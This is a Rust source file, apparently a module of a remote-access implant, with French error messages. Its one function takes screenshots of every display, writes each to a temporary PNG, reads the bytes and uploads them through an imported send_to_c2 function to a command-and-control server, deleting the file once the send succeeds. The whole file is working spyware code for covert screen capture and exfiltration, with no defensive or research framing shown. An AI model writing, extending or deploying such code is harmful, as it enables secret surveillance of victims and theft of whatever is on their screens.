use screenshots::Screen;
use std::{fs::File, io::Read, path::PathBuf};
use tempfile::NamedTempFile;
use crate::connexion::send_to_c2;


pub async fn take_screenshot() {
    let screens = match Screen::all() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Erreur lors de la récupartion des écrans : {}", e);
            return;
        }
    };

    for screen in screens {
        match screen.capture() {
            Ok(image) => {

                let tmpfile = match NamedTempFile::new() {
                    Ok(f) => f,
                    Err(e) => {
                        eprintln!("Erreur création fichier temporaire : {}", e);
                        continue;
                    }
                };

                let mut png_path = PathBuf::from(tmpfile.path());
                png_path.set_extension("png");

                if let Err(e) = image.save(&png_path) {
                    eprintln!("Erreur lors de la sauvegarde de {}", e);
                    continue;
                }

                let mut file = match File::open(&png_path) {
                    Ok(f) => f,
                    Err(e) => {
                        eprintln!("Erreur ouverture fichier temporaire : {}", e);
                        continue;
                    }
                };

                let mut buff: Vec<u8> = Vec::new();
                
                if let Err(e) = file.read_to_end(&mut buff) {
                    eprintln!("Erreur lecture du fichier : {}", e);
                    continue;
                }

                match send_to_c2(buff).await {
                    Ok(_) =>  {
                        println!("Image envoyée");
                        let _ = std::fs::remove_file(&png_path);
                    }
                    Err(e) => println!("Erreur lors de l'envoi {}", e)
                };

            }
            Err(e) => {
                eprintln!("Erreur lors de la capture de l'écran {} : {}", screen.display_info.id, e);
            }
        }
    }
}